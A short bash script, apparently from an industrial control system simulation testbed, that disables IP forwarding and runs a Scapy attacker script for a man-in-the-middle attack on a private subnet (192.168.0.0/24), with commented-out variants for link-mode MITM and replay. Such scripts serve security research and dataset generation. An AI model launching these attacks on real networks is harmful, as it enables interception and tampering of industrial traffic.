#!/bin/bash

#cd src
sudo echo 0 > /proc/sys/net/ipv4/ip_forward
sudo python3 ics_sim/ScapyAttacker.py --output $2 --attack mitm --timeout 15  --parameter 0.1 --destination '192.168.0.1/24'
#sudo python3 ics_sim/ScapyAttacker.py --output $2 --attack mitm --mode 'link' --timeout 15  --parameter 0.2 --destination '192.168.0.11,192.168.0.21'
#sudo python3 Replay.py
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
